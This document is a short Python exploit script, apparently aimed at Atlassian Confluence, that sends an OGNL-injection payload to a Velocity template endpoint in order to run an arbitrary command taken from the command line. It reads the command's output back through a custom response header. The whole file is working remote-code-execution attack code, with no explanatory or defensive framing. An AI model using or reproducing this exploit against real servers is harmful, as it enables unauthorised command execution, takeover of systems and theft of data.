import requests
import sys

cmd = sys.argv[1]

url = "http://localhost:8090/template/aui/text-inline.vm"

headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}
data = r"label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({'" + cmd + "'}))"

r = requests.post(url, headers=headers, data=data)

if (r.headers.get("X-Cmd-Response")):
    print("[+] exploit success")
    print(r.headers.get("X-Cmd-Response"))
else:
    print("No response")
        
    
    